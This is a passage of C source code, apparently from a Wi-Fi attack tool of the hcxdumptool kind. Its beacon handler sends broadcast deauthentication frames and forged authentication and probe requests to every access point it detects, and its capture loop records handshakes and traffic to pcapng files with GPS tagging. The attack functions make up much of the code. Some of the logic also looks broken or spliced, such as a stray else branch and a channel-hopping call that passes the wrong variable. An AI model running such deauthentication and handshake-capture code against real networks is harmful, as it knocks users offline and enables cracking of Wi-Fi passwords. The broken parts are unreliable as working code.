		if ((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX)) {
			aplist_ptr->rsn_len = rsntag->len;
			memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

	if (attackapflag == false) {
		send_directed_proberequest(macfrx->addr2, essidtag->len,
					   essidtag->data);
	}
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	aplist_ptr++;
	aplistcount++;
	if (aplistcount > APLIST_MAX) {
		aplistcount = APLIST_MAX;
	}
	return;
}

/*===========================================================================*/
static inline void process80211beacon()
{
	static aplist_t *zeiger;
	static uint8_t *apinfoptr;
	static int apinfolen;
	static uint8_t *essidtagptr;
	static ietag_t *essidtag = NULL;
	static uint8_t *channeltagptr;
	static ietag_t *channeltag = NULL;
	static uint8_t *rsntagptr;
	static ietag_t *rsntag = NULL;

	if (payload_len < (int) CAPABILITIESAP_SIZE) {
		return;
	}
	apinfoptr = payload_ptr + CAPABILITIESAP_SIZE;
	apinfolen = payload_len - CAPABILITIESAP_SIZE;
	if (apinfolen < (int) IETAG_SIZE) {
		return;
	}

	for (zeiger = aplist; zeiger < aplist + APLIST_MAX; zeiger++) {
		if (zeiger->timestamp == 0) {
			aplist_ptr = zeiger;
			break;
		}
		if (memcmp(zeiger->addr, macfrx->addr2, 6) == 0) {
			zeiger->timestamp = timestamp;
			if (((zeiger->count % deauthenticationintervall) == 0)
			    && (zeiger->count <
				(deauthenticationsmax *
				 deauthenticationintervall))) {
				if (deauthenticationflag == false) {
					send_broadcast_deauthentication(macfrx->
									addr2,
									WLAN_REASON_UNSPECIFIED);
				}
			}
			if (((zeiger->count % apattacksintervall) == 0)
			    && (zeiger->count <
				(apattacksmax * apattacksintervall))) {
				if (attackapflag == false) {
					if ((zeiger->rsn_len != 0)
					    && (zeiger->essid_len != 0)
					    && (zeiger->essid[0] != 0)) {
						send_authenticationrequestopensystem
						    (macfrx->addr2);
					} else {
						send_directed_proberequest
						    (macfrx->addr2,
						     essidtag->len,
						     essidtag->data);
					}
				}
			}
			zeiger->count++;
			return;
		}
	}

	if ((aplist_ptr - aplist) >= APLIST_MAX) {
		qsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_time);
		aplist_ptr = aplist;
	}

	if (deauthenticationflag == false) {
		send_broadcast_deauthentication(macfrx->addr2,
						WLAN_REASON_UNSPECIFIED);
		send_broadcast_deauthentication(macfrx->addr2,
						WLAN_REASON_UNSPECIFIED);
		aplist_ptr->count = 2;
	}

	memset(aplist_ptr, 0, APLIST_SIZE);
	aplist_ptr->timestamp = timestamp;
	if (memcmp(&mac_mysta, macfrx->addr1, 6) == 0) {
		aplist_ptr->status = 1;
	}

	memcpy(aplist_ptr->addr, macfrx->addr2, 6);

	aplist_ptr->channel = channelscanlist[cpa];
	channeltagptr = gettag(TAG_CHAN, apinfoptr, apinfolen);
	if (channeltagptr != NULL) {
		channeltag = (ietag_t *) channeltagptr;
		aplist_ptr->channel = channeltag->data[0];
	}

	essidtagptr = gettag(TAG_SSID, apinfoptr, apinfolen);
	if (essidtagptr != NULL) {
		essidtag = (ietag_t *) essidtagptr;
		if (essidtag->len <= ESSID_LEN_MAX) {
			aplist_ptr->essid_len = essidtag->len;
			memcpy(aplist_ptr->essid, essidtag->data,
			       essidtag->len);
		}
	}

	rsntagptr = gettag(TAG_RSN, apinfoptr, apinfolen);
	if (rsntagptr != NULL) {
		rsntag = (ietag_t *) rsntagptr;
		if ((rsntag->len >= 20) && (rsntag->len <= RSN_LEN_MAX)) {
			aplist_ptr->rsn_len = rsntag->len;
			memcpy(aplist_ptr->rsn, rsntag->data, rsntag->len);
		}
	}

	else {
		aplist_ptr->status = 0;
	}

	aplist_ptr->essid_len = essidtag->len;
	memset(aplist_ptr->essid, 0, ESSID_LEN_MAX);
	memcpy(aplist_ptr->essid, essidtag->data, essidtag->len);
	if (attackapflag == false) {
		if ((aplist_ptr->rsn_len != 0) && (aplist_ptr->essid_len != 0)
		    && (aplist_ptr->essid[0] != 0)) {
			send_authenticationrequestopensystem(macfrx->addr2);
		} else {
			send_directed_proberequest(macfrx->addr2, essidtag->len,
						   essidtag->data);
		}
	}
	if (fd_pcapng != 0) {
		writeepb(fd_pcapng);
	}
	if ((statusout & STATUS_BEACON) == STATUS_BEACON) {
		printtimenet(macfrx->addr1, macfrx->addr2);
		printessid(aplist_ptr->essid_len, aplist_ptr->essid);
		fprintf(stdout, " [BEACON, SEQUENCE %d, AP CHANNEL %d]\n",
			macfrx->sequence >> 4, aplist_ptr->channel);
	}
	aplist_ptr++;
	return;
}

/*===========================================================================*/
static inline void programmende(int signum)
{
	if ((signum == SIGINT) || (signum == SIGTERM) || (signum == SIGKILL)) {
		wantstopflag = true;
	}
	return;
}

/*===========================================================================*/
static bool set_channel(uint8_t ch)
{
	static int res;
	static struct iwreq pwrq;

	res = 0;
	memset(&pwrq, 0, sizeof(pwrq));
	strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ - 1);
	pwrq.u.freq.e = 0;
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = ch;
	res = ioctl(fd_socket, SIOCSIWFREQ, &pwrq);
	if (res < 0) {
		return false;
	}
	return true;
}

/*===========================================================================*/
static void test_channels(uint8_t ch)
{
	int res;
	struct iwreq pwrq;

	usleep(10000);
	memset(&pwrq, 0, sizeof(pwrq));
	strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ - 1);
	pwrq.u.freq.e = 0;
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = 2;
	res = ioctl(fd_socket, SIOCSIWFREQ, &pwrq);

	usleep(10000);
	memset(&pwrq, 0, sizeof(pwrq));
	strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ - 1);
	pwrq.u.freq.e = 0;
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	pwrq.u.freq.m = ch;
	res = ioctl(fd_socket, SIOCSIWFREQ, &pwrq);
	if (res < 0) {
		printf("warning: failed to set channel %d (%s) - removed this channel from scan list\n",
		       ch, strerror(errno));
		return;
	}

	usleep(10000);
	memset(&pwrq, 0, sizeof(pwrq));
	strncpy(pwrq.ifr_name, interfacename, IFNAMSIZ - 1);
	pwrq.u.freq.e = 0;
	pwrq.u.freq.flags = IW_FREQ_FIXED;
	res = ioctl(fd_socket, SIOCGIWFREQ, &pwrq);
	if (res < 0) {
		printf("warning: failed to set channel %d (%s) - removed this channel from scan list\n",
		       ch, strerror(errno));
		return;
	}
	
	return;
}

/*===========================================================================*/
static inline bool activate_gpsd()
{
	static int c;
	static struct sockaddr_in gpsd_addr;
	static int fdnum;
	static fd_set readfds;
	static struct timeval tvfd;
	char *gpsdptr;
	char *gpsd_lat = "\"lat\":";
	char *gpsd_lon = "\"lon\":";
	char *gpsd_alt = "\"alt\":";
	char *gpsd_enable_json = "?WATCH={\"json\":true}";
	char *gpsd_disable = "?WATCH={\"enable\":false}";
	char *gpsd_version = "\"proto_major\":3";
	char *gpsd_json = "\"json\":true";
	char *gpsd_tpv = "\"class\":\"TPV\"";

	printf("connecting to GPSD...\n");
	gpsd_len = 0;
	memset(&gpsddata, 0, GPSDDATA_MAX + 1);
	memset(&gpsd_addr, 0, sizeof(struct sockaddr_in));
	gpsd_addr.sin_family = AF_INET;
	gpsd_addr.sin_port = htons(2947);
	gpsd_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	if (connect
	    (fd_socket_gpsd, (struct sockaddr *) &gpsd_addr,
	     sizeof(gpsd_addr)) < 0) {
		perror("failed to connect to GPSD");
		return false;
	}

	tvfd.tv_sec = 1;
	tvfd.tv_usec = 0;
	FD_ZERO(&readfds);
	FD_SET(fd_socket_gpsd, &readfds);
	fdnum = select(fd_socket_gpsd + 1, &readfds, NULL, NULL, &tvfd);
	if (fdnum <= 0) {
		fprintf(stderr, "failed to select GPS socket\n");
		return false;
	}
	if (FD_ISSET(fd_socket_gpsd, &readfds)) {
		gpsd_len = read(fd_socket_gpsd, gpsddata, GPSDDATA_MAX);
		if (gpsd_len <= 0) {
			fprintf(stderr, "failed to get GPSD identification\n");
			gpsd_len = 0;
			return false;
		}
		gpsddata[gpsd_len] = 0;
		if (strstr(gpsddata, gpsd_version) == NULL) {
			printf("unsupported GPSD version (not 3)\n");
			gpsd_len = 0;
			return false;
		}
	}

	if (write(fd_socket_gpsd, gpsd_enable_json, 20) != 20) {
		perror("failed to activate GPSD WATCH");
		gpsd_len = 0;
		return false;
	}

	tvfd.tv_sec = 1;
	tvfd.tv_usec = 0;
	FD_ZERO(&readfds);
	FD_SET(fd_socket_gpsd, &readfds);
	fdnum = select(fd_socket_gpsd + 1, &readfds, NULL, NULL, &tvfd);
	if (fdnum <= 0) {
		fprintf(stderr, "GPSD timeout\n");
		if (write(fd_socket_gpsd, gpsd_disable, 23) != 23) {
			perror("failed to terminate GPSD WATCH");
		}
		gpsd_len = 0;
		return false;
	}
	if (FD_ISSET(fd_socket_gpsd, &readfds)) {
		gpsd_len = read(fd_socket_gpsd, gpsddata, GPSDDATA_MAX);
		if (gpsd_len <= 0) {
			fprintf(stderr, "failed to get GPSD protocol\n");
			if (write(fd_socket_gpsd, gpsd_disable, 23) != 23) {
				perror("failed to terminate GPSD WATCH");
			}
			gpsd_len = 0;
			return false;
		}
		gpsddata[gpsd_len] = 0;
		if (strstr(gpsddata, gpsd_json) == NULL) {
			printf("unsupported GPSD protocol (not json)\n");
			if (write(fd_socket_gpsd, gpsd_disable, 23) != 23) {
				perror("failed to terminate GPSD WATCH");
			}
			gpsd_len = 0;
			return false;
		}
	}
	printf("waiting up to 5 seconds to retrieve first position\n");
	c = 0;
	while (c < 5) {
		tvfd.tv_sec = 5;
		tvfd.tv_usec = 0;
		FD_ZERO(&readfds);
		FD_SET(fd_socket_gpsd, &readfds);
		fdnum = select(fd_socket_gpsd + 1, &readfds, NULL, NULL, &tvfd);
		if (fdnum <= 0) {
			fprintf(stderr,
				"failed to read initial GPSD position\n");
			if (write(fd_socket_gpsd, gpsd_disable, 23) != 23) {
				perror("failed to terminate GPSD WATCH");
			}
			gpsd_len = 0;
			return false;
		}
		if (FD_ISSET(fd_socket_gpsd, &readfds)) {
			gpsd_len = read(fd_socket_gpsd, gpsddata, GPSDDATA_MAX);
			if (gpsd_len <= 0) {
				perror("failed to get GPSD protocol");
				if (write(fd_socket_gpsd, gpsd_disable, 23) !=
				    23) {
					perror
					    ("failed to terminate GPSD WATCH");
				}
				gpsd_len = 0;
				return false;
			}
			gpsddata[gpsd_len] = 0;
			if (strstr(gpsddata, gpsd_tpv) != NULL) {
				break;
			}
		}
		c++;
	}

	if (c < 5) {
		if ((gpsdptr = strstr(gpsddata, gpsd_lat)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &lat);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_lon)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &lon);
		}
		if ((gpsdptr = strstr(gpsddata, gpsd_alt)) != NULL) {
			sscanf(gpsdptr + 6, "%Lf", &alt);
		}
		if ((lat == 0) && (lon == 0)) {
			if (write(fd_socket_gpsd, gpsd_disable, 23) != 23) {
				perror("failed to terminate GPSD WATCH");
				gpsd_len = 0;
				return false;
			}
		}
		printf("GPSD activated\n");
		return true;
	}
	fprintf(stderr, "failed to get GPSD position\n");
	if (write(fd_socket_gpsd, gpsd_disable, 23) != 23) {
		perror("failed to terminate GPSD WATCH");
	}
	gpsd_len = 0;
	return false;
}

/*===========================================================================*/
static inline void processpackets(uint8_t ch)
{
	static int c;
	static int sa;
	static unsigned long long int statuscount;
	static unsigned long long int oldincommingcount1;
	static unsigned long long int oldincommingcount5;

	static char *gpsdptr;
	static char *gpsd_time = "\"time\":";
	static char *gpsd_lat = "\"lat\":";
	static char *gpsd_lon = "\"lon\":";
	static char *gpsd_alt = "\"alt\":";

	static rth_t *rth;
	static int fdnum;
	static fd_set readfds;
	static struct timeval tvfd;

	static uint8_t lastaddr1proberequest[6];
	static uint8_t lastaddr2proberequest[6];
	static uint16_t lastsequenceproberequest;

	static uint8_t lastaddr1proberesponse[6];
	static uint8_t lastaddr2proberesponse[6];
	static uint16_t lastsequenceproberesponse;

	static uint8_t lastaddr1authentication[6];
	static uint8_t lastaddr2authentication[6];
	static uint16_t lastsequenceauthentication;

	static uint8_t lastaddr1associationrequest[6];
	static uint8_t lastaddr2associationrequest[6];
	static uint16_t lastsequenceassociationrequest;

	static uint8_t lastaddr1associationresponse[6];
	static uint8_t lastaddr2associationresponse[6];
	static uint16_t lastsequenceassociationresponse;

	static uint8_t lastaddr1reassociationrequest[6];
	static uint8_t lastaddr2reassociationrequest[6];
	static uint16_t lastsequencereassociationrequest;

	static uint8_t lastaddr1reassociationresponse[6];
	static uint8_t lastaddr2reassociationresponse[6];
	static uint16_t lastsequencereassociationresponse;

	static uint8_t lastaddr1data[6];
	static uint8_t lastaddr2data[6];
	static uint16_t lastsequencedata;

	memset(&lastaddr1proberequest, 0, 6);
	memset(&lastaddr2proberequest, 0, 6);
	lastsequenceproberequest = 0;

	memset(&lastaddr1proberesponse, 0, 6);
	memset(&lastaddr2proberesponse, 0, 6);
	lastsequenceproberesponse = 0;

	memset(&lastaddr1authentication, 0, 6);
	memset(&lastaddr2authentication, 0, 6);
	lastsequenceauthentication = 0;

	memset(&lastaddr1associationrequest, 0, 6);
	memset(&lastaddr2associationrequest, 0, 6);
	lastsequenceassociationrequest = 0;

	memset(&lastaddr1associationresponse, 0, 6);
	memset(&lastaddr2associationresponse, 0, 6);
	lastsequenceassociationresponse = 0;

	memset(&lastaddr1reassociationrequest, 0, 6);
	memset(&lastaddr2reassociationrequest, 0, 6);
	lastsequencereassociationrequest = 0;

	memset(&lastaddr1reassociationresponse, 0, 6);
	memset(&lastaddr2reassociationresponse, 0, 6);
	lastsequencereassociationresponse = 0;

	memset(&lastaddr1data, 0, 6);
	memset(&lastaddr2data, 0, 6);
	lastsequencedata = 0;

	sa = 1;
	if (gpsdflag == true) {
		if (activate_gpsd() == false) {
			gpsdflag = false;
		} else {
			if ((gpsdptr = strstr(gpsddata, gpsd_time)) != NULL) {
				sscanf(gpsdptr + 8, "%d-%d-%dT%d:%d:%d;", &year,
				       &month, &day, &hour, &minute, &second);
			}
			if ((gpsdptr = strstr(gpsddata, gpsd_lat)) != NULL) {
				sscanf(gpsdptr + 6, "%Lf", &lat);
			}
			if ((gpsdptr = strstr(gpsddata, gpsd_lon)) != NULL) {
				sscanf(gpsdptr + 6, "%Lf", &lon);
			}
			if ((gpsdptr = strstr(gpsddata, gpsd_alt)) != NULL) {
				sscanf(gpsdptr + 6, "%Lf", &alt);
			}
			printf("\e[?25l\nstart capturing (stop with ctrl+c)\n"
			       "GPS LATITUDE.............: %Lf\n"
			       "GPS LONGITUDE............: %Lf\n"
			       "GPS ALTITUDE.............: %Lf\n"
			       "GPS DATE.................: %02d.%02d.%04d\n"
			       "GPS TIME.................: %02d:%02d:%02d\n"
			       "INTERFACE................: %s\n"
			       "ERRORMAX.................: %d errors\n"
			       "FILTERLIST...............: %d entries\n"
			       "MAC CLIENT...............: %06x%06x\n"
			       "MAC ACCESS POINT.........: %06x%06x (incremented on every new ESSID)\n"
			       "EAPOL TIMEOUT............: %d\n"
			       "REPLAYCOUNT..............: %llu\n"
			       "ANONCE...................: ",
			       lat, lon, alt, day, month, year, hour, minute,
			       second, interfacename, maxerrorcount,
			       filterlist_len, myouista, mynicsta, myouiap,
			       mynicap, eapoltimeout, rcrandom);
			for (c = 0; c < 32; c++) {
				printf("%02x", anoncerandom[c]);
			}
			printf("\n\n");
			sa = 2;
		}
	}

	if (gpsdflag == false) {
		printf("\e[?25l\nstart capturing (stop with ctrl+c)\n"
		       "INTERFACE................: %s\n"
		       "ERRORMAX.................: %d errors\n"
		       "FILTERLIST...............: %d entries\n"
		       "MAC CLIENT...............: %06x%06x\n"
		       "MAC ACCESS POINT.........: %06x%06x (incremented on every new client)\n"
		       "EAPOL TIMEOUT............: %d\n"
		       "REPLAYCOUNT..............: %llu\n"
		       "ANONCE...................: ",
		       interfacename, maxerrorcount, filterlist_len, myouista,
		       mynicsta, myouiap, mynicap, eapoltimeout, rcrandom);
		for (c = 0; c < 32; c++) {
			printf("%02x", anoncerandom[c]);
		}
		printf("\n\n");
	}
	gettimeofday(&tv, NULL);
	timestamp = ((uint64_t) tv.tv_sec * 1000000) + tv.tv_usec;
	timestampstart = timestamp;

	tvfd.tv_sec = 1;
	tvfd.tv_usec = 0;
	statuscount = 1;
	oldincommingcount1 = 0;
	oldincommingcount5 = 0;

	if (set_channel(ch) == false) {
		fprintf(stderr, "failed to set channel\n");
		globalclose();
	}
	if (activescanflag == false) {
		send_broadcastbeacon();
		send_undirected_proberequest();
	}

	while (1) {
		if (gpiobutton > 0) {
			if (GET_GPIO(gpiobutton) > 0) {
				globalclose();
			}
		}
		if (wantstopflag == true) {
			globalclose();
		}
		if (errorcount >= maxerrorcount) {
			fprintf(stderr,
				"\nmaximum number of errors is reached\n");
			globalclose();
		}
		FD_ZERO(&readfds);
		FD_SET(fd_socket, &readfds);
		FD_SET(fd_socket_gpsd, &readfds);
		fdnum = select(fd_socket + sa, &readfds, NULL, NULL, &tvfd);
		if (fdnum < 0) {
			errorcount++;
			continue;
		} else if (FD_ISSET(fd_socket_gpsd, &readfds)) {
			gpsd_len = read(fd_socket_gpsd, gpsddata, GPSDDATA_MAX);
			if (gpsd_len < 0) {
				perror("\nfailed to read GPS data");
				errorcount++;
				continue;
			}
			if (gpsd_len >= 0) {
				gpsddata[gpsd_len] = 0;
#ifdef DEBUG
				fprintf(stdout, "\nGPS: %s\n", gpsddata);
#endif
			}
			continue;
		} else if (FD_ISSET(fd_socket, &readfds)) {
			packet_len =
			    read(fd_socket, epb + EPB_SIZE, PCAPNG_MAXSNAPLEN);
			if (packet_len == 0) {
				fprintf(stderr, "\ninterface went down\n");
				globalclose();
			}
			if (packet_len < 0) {
				perror("\nfailed to read packet");
				errorcount++;
				continue;
			}
#ifdef DEBUG
			debugprint(packet_len, &epb[EPB_SIZE]);
#endif
			if (packet_len < (int) RTH_SIZE) {
				fprintf(stderr,
					"\ngot damged radiotap header\n");
				errorcount++;
				continue;
			}
			if (ioctl(fd_socket, SIOCGSTAMP, &tv) < 0) {
				perror("\nfailed to get time");
				errorcount++;
				continue;
			}
			timestamp =
			    ((uint64_t) tv.tv_sec * 1000000) + tv.tv_usec;
		} else {
			if ((statuscount % 5) == 0) {
				if (gpiostatusled > 0) {
					GPIO_SET = 1 << gpiostatusled;
					if (incommingcount !=
					    oldincommingcount5) {
						usleep(GPIO_DELAY);
						GPIO_CLR = 1 << gpiostatusled;
					}
					oldincommingcount5 = incommingcount;
				}
				if (gpsdflag == false) {
					printf
					    ("\33[2K\rINFO: cha=%d, rx=%llu, rx(dropped)=%llu, tx=%llu, powned=%llu, err=%d",
					     ch,
					     incommingcount, droppedcount,
					     outgoingcount, pownedcount,
					     errorcount);
				} else {
					if ((gpsdptr =
					     strstr(gpsddata,
						    gpsd_time)) != NULL) {
						sscanf(gpsdptr + 8,
						       "%d-%d-%dT%d:%d:%d;",
						       &year, &month, &day,
						       &hour, &minute, &second);
					}
					if ((gpsdptr =
					     strstr(gpsddata,
						    gpsd_lat)) != NULL) {
						sscanf(gpsdptr + 6, "%Lf",
						       &lat);
					}
					if ((gpsdptr =
					     strstr(gpsddata,
						    gpsd_lon)) != NULL) {
						sscanf(gpsdptr + 6, "%Lf",
						       &lon);
					}
					if ((gpsdptr =
					     strstr(gpsddata,
						    gpsd_alt)) != NULL) {
						sscanf(gpsdptr + 6, "%Lf",
						       &alt);
					}
					printf
					    ("\33[2K\rINFO: cha=%d, rx=%llu, rx(dropped)=%llu, tx=%llu, powned=%llu, err=%d, lat=%Lf, lon=%Lf, alt=%Lf, gpsdate=%02d.%02d.%04d, gpstime=%02d:%02d:%02d",
					     channelscanlist[cpa],
					     incommingcount, droppedcount,
					     outgoingcount, pownedcount,
					     errorcount, lat, lon, alt, day,
					     month, year, hour, minute, second);
				}
			}
			if (((statuscount % staytime) == 0)
			    || ((staytimeflag != true)
				&& (incommingcount == oldincommingcount1))) {
				cpa++;
				if (channelscanlist[cpa] == 0) {
					cpa = 0;
				}
				if (set_channel(ch) == true) {
					if (activescanflag == false) {
						send_broadcastbeacon();
						send_undirected_proberequest();
					}
				} else {
					printf("\nfailed to set channel\n");
					globalclose();
				}
			}
			oldincommingcount1 = incommingcount;
			tvfd.tv_sec = 1;
			tvfd.tv_usec = 0;
			statuscount++;
			continue;
		}
		packet_ptr = &epb[EPB_SIZE];
		rth = (rth_t *) packet_ptr;
		ieee82011_ptr = packet_ptr + le16toh(rth->it_len);
		ieee82011_len = packet_len - le16toh(rth->it_len);
		if (rth->it_present == 0) {
			continue;
		}
		if ((rth->it_present & 0x20) != 0) {
			incommingcount++;
		}
		if (packet_len < (int) RTH_SIZE + (int) MAC_SIZE_NORM) {
			droppedcount++;
			continue;
		}
		macfrx = (mac_t *) ieee82011_ptr;
		if ((macfrx->from_ds == 1) && (macfrx->to_ds == 1)) {
			payload_ptr = ieee82011_ptr + MAC_SIZE_LONG;
			payload_len = ieee82011_len - MAC_SIZE_LONG;
		} else {
			payload_ptr = ieee82011_ptr + MAC_SIZE_NORM;
			payload_len = ieee82011_len - MAC_SIZE_NORM;
		}

		if (macfrx->type == IEEE80211_FTYPE_MGMT) {
			if ((rth->it_present & 0x20) == 0) {
				continue;
			}
			if (memcmp(macfrx->addr2, &mac_broadcast, 6) == 0) {
				droppedcount++;
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_BEACON) {
				if (filtermode == 3) {
					if (checkfilterlistentry(macfrx->addr2)
					    == false) {
						continue;
					}
				}
				process80211beacon();
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_PROBE_REQ) {
				if ((macfrx->sequence ==
				     lastsequenceproberequest)
				    &&
				    (memcmp
				     (macfrx->addr1, &lastaddr1proberequest,
				      6) == 0)
				    &&
				    (memcmp
				     (macfrx->addr2, &lastaddr2proberequest,
				      6) == 0)) {
					droppedcount++;
					continue;
				}
				lastsequenceproberequest = macfrx->sequence;
				memcpy(&lastaddr1proberequest, macfrx->addr1,
				       6);
				memcpy(&lastaddr2proberequest, macfrx->addr2,
				       6);
				if (filtermode == 3) {
					if ((checkfilterlistentry(macfrx->addr1)
					     == false)
					    &&
					    (checkfilterlistentry(macfrx->addr2)
					     == false)) {
						continue;
					}
				}
				if (memcmp(macfrx->addr1, &mac_broadcast, 6) ==
				    0) {
					process80211probe_req();
				} else if (memcmp(macfrx->addr1, &mac_null, 6)
					   == 0) {
					process80211probe_req();
				} else {
					process80211directed_probe_req();
				}
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_PROBE_RESP) {
				if ((macfrx->sequence ==
				     lastsequenceproberesponse)
				    &&
				    (memcmp
				     (macfrx->addr1, &lastaddr1proberesponse,
				      6) == 0)
				    &&
				    (memcmp
				     (macfrx->addr2, &lastaddr2proberesponse,
				      6) == 0)) {
					droppedcount++;
					continue;
				}
				lastsequenceproberesponse = macfrx->sequence;
				memcpy(&lastaddr1proberesponse, macfrx->addr1,
				       6);
				memcpy(&lastaddr2proberesponse, macfrx->addr2,
				       6);
				if (filtermode == 3) {
					if ((checkfilterlistentry(macfrx->addr1)
					     == false)
					    &&
					    (checkfilterlistentry(macfrx->addr2)
					     == false)) {
						continue;
					}
				}
				process80211probe_resp();
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_AUTH) {
				if ((macfrx->sequence ==
				     lastsequenceauthentication)
				    &&
				    (memcmp
				     (macfrx->addr1, &lastaddr1authentication,
				      6) == 0)
				    &&
				    (memcmp
				     (macfrx->addr2, &lastaddr2authentication,
				      6) == 0)) {
					droppedcount++;
					continue;
				}
				lastsequenceauthentication = macfrx->sequence;
				memcpy(&lastaddr1authentication, macfrx->addr1,
				       6);
				memcpy(&lastaddr2authentication, macfrx->addr2,
				       6);
				if (filtermode == 3) {
					if ((checkfilterlistentry(macfrx->addr1)
					     == false)
					    &&
					    (checkfilterlistentry(macfrx->addr2)
					     == false)) {
						continue;
					}
				}
				process80211authentication();
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_ASSOC_REQ) {
				if ((macfrx->sequence ==
				     lastsequenceassociationrequest)
				    &&
				    (memcmp
				     (macfrx->addr1,
				      &lastaddr1associationrequest, 6) == 0)
				    &&
				    (memcmp
				     (macfrx->addr2,
				      &lastaddr2associationrequest, 6) == 0)) {
					droppedcount++;
					continue;
				}
				lastsequenceassociationrequest =
				    macfrx->sequence;
				memcpy(&lastaddr1associationrequest,
				       macfrx->addr1, 6);
				memcpy(&lastaddr2associationrequest,
				       macfrx->addr2, 6);
				if (filtermode == 3) {
					if ((checkfilterlistentry(macfrx->addr1)
					     == false)
					    &&
					    (checkfilterlistentry(macfrx->addr2)
					     == false)) {
						continue;
					}
				}
				process80211association_req();
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_ASSOC_RESP) {
				if ((macfrx->sequence ==
				     lastsequenceassociationresponse)
				    &&
				    (memcmp
				     (macfrx->addr1,
				      &lastaddr1associationresponse, 6) == 0)
				    &&
				    (memcmp
				     (macfrx->addr2,
				      &lastaddr2associationresponse, 6) == 0)) {
					droppedcount++;
					continue;
				}
				lastsequenceassociationresponse =
				    macfrx->sequence;
				memcpy(&lastaddr1associationresponse,
				       macfrx->addr1, 6);
				memcpy(&lastaddr2associationresponse,
				       macfrx->addr2, 6);
				if (filtermode == 3) {
					if ((checkfilterlistentry(macfrx->addr1)
					     == false)
					    &&
					    (checkfilterlistentry(macfrx->addr2)
					     == false)) {
						continue;
					}
				}
				process80211association_resp();
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_REASSOC_REQ) {
				if ((macfrx->sequence ==
				     lastsequencereassociationrequest)
				    &&
				    (memcmp
				     (macfrx->addr1,
				      &lastaddr1reassociationrequest, 6) == 0)
				    &&
				    (memcmp
				     (macfrx->addr2,
				      &lastaddr2reassociationrequest,
				      6) == 0)) {
					droppedcount++;
					continue;
				}
				lastsequencereassociationrequest =
				    macfrx->sequence;
				memcpy(&lastaddr1reassociationrequest,
				       macfrx->addr1, 6);
				memcpy(&lastaddr2reassociationrequest,
				       macfrx->addr2, 6);
				if (filtermode == 3) {
					if ((checkfilterlistentry(macfrx->addr1)
					     == false)
					    &&
					    (checkfilterlistentry(macfrx->addr2)
					     == false)) {
						continue;
					}
				}
				process80211reassociation_req();
				continue;
			}
			if (macfrx->subtype == IEEE80211_STYPE_REASSOC_RESP) {
				if ((macfrx->sequence ==
				     lastsequencereassociationresponse)
				    &&
				    (memcmp
				     (macfrx->addr1,
				      &lastaddr1reassociationresponse, 6) == 0)
				    &&
				    (memcmp
				     (macfrx->addr2,
				      &lastaddr2reassociationresponse,
				      6) == 0)) {
					droppedcount++;
					continue;
				}
				lastsequencereassociationresponse =
				    macfrx->sequence;
				memcpy(&lastaddr1reassociationresponse,
				       macfrx->addr1, 6);
				memcpy(&lastaddr2reassociationresponse,
				       macfrx->addr2, 6);
				if (filtermode == 3) {
					if ((checkfilterlistentry(macfrx->addr1)
					     == false)
					    &&
					    (checkfilterlistentry(macfrx->addr2)
					     == false)) {
						continue;
					}
				}
				process80211reassociation_resp();
				continue;
			}
			droppedcount++;
			continue;
		}
		if (macfrx->type == IEEE80211_FTYPE_CTL) {
			droppedcount++;
			continue;
		}
		if (macfrx->type == IEEE80211_FTYPE_DATA) {
			if ((macfrx->sequence == lastsequencedata)
			    && (memcmp(macfrx->addr1, &lastaddr1data, 6) == 0)
			    && (memcmp(macfrx->addr2, &lastaddr2data, 6) ==
				0)) {
				droppedcount++;
				continue;
			}
			lastsequencedata = macfrx->sequence;
			memcpy(&lastaddr1data, macfrx->addr1, 6);
			memcpy(&lastaddr2data, macfrx->addr2, 6);
			if ((macfrx->subtype & IEEE80211_STYPE_QOS_DATA) ==
			    IEEE80211_STYPE_QOS_DATA) {
				payload_ptr += QOS_SIZE;
				payload_len -= QOS_SIZE;
			}
			if (macfrx->subtype == IEEE80211_STYPE_NULLFUNC) {
				continue;
			}
			if (payload_len < (int) LLC_SIZE) {
				continue;
			}
			llc_ptr = payload_ptr;
			llc = (llc_t *) llc_ptr;
			if (filtermode == 3) {
				if ((checkfilterlistentry(macfrx->addr1) ==
				     false)
				    && (checkfilterlistentry(macfrx->addr2) ==
					false)) {
					continue;
				}
			}
			if (((ntohs(llc->type)) == LLC_TYPE_AUTH)
			    && (llc->dsap == LLC_SNAP)
			    && (llc->ssap == LLC_SNAP)) {
				if (process80211eap()) break;
				else continue;
			}
			if (((ntohs(llc->type)) == LLC_TYPE_IPV4)
			    && (llc->dsap == LLC_SNAP)
			    && (llc->ssap == LLC_SNAP)) {
				if (fd_ippcapng != 0) {
					writeepb(fd_ippcapng);
				}
				continue;
			}
			if (((ntohs(llc->type)) == LLC_TYPE_IPV6)
			    && (llc->dsap == LLC_SNAP)
			    && (llc->ssap == LLC_SNAP)) {
				if (fd_ippcapng != 0) {
					writeepb(fd_ippcapng);
				}
				continue;
			}
			if (macfrx->protected == 1) {
				if (fd_weppcapng != 0) {
					mpdu_ptr = payload_ptr;
					mpdu = (mpdu_t *) mpdu_ptr;
					if (((mpdu->keyid >> 5) & 1) == 0) {
						writeepb(fd_weppcapng);
					}
				}
				continue;
			}
			droppedcount++;
		}
	}
	return;
}

/*===========================================================================*/
static inline void processrcascan(uint8_t ch)
{
	static int fdnum;
	static long long int statuscount;
	static rth_t *rth;
	static fd_set readfds;
	static struct timeval tvfd;

	gettimeofday(&tv, NULL);
